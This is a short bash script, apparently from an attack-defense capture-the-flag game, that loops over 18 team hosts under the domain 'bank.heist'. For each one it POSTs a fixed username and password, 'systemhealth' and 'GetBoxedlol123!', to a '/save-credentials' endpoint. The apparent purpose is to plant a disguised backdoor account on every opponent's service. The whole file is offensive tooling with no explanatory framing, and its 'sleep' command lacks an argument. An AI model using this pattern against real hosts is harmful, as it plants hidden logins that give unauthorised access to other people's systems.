#!/bin/bash

for i in {1..18}; do
  echo -e "Sending request for Team $i\n"
  
  response=$(curl -s -X POST "http://wire.team$i.bank.heist:817/save-credentials" \
    -H "Content-Type: application/json" \
    -d '{"username":"systemhealth","password":"GetBoxedlol123!"}')
  
  echo -e "Response from Team $i: $response\n"
  echo -e "---------------------------------\n"
  
  sleep 
done
